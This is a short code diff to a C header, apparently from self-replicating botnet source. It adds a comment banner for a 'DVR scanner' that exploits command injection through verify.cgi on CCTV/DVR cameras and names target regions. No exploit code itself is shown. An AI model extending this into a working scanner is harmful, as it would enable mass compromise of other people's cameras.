@@ -1,5 +1,14 @@
 #ifdef SELFREP
 
+/* ============================================================================
+ * DVR SCANNER - CCTV/DVR Camera Exploitation (Port 80)
+ * ============================================================================
+ * Exploit: DVR camera command injection via verify.cgi
+ * Targets: CCTV/DVR cameras globally
+ * Regions: Asia, Middle East, Africa, Latin America
+ * Brands: Various DVR camera manufacturers
+ * ============================================================================ */
+
 #pragma once
 
 #include <stdint.h>
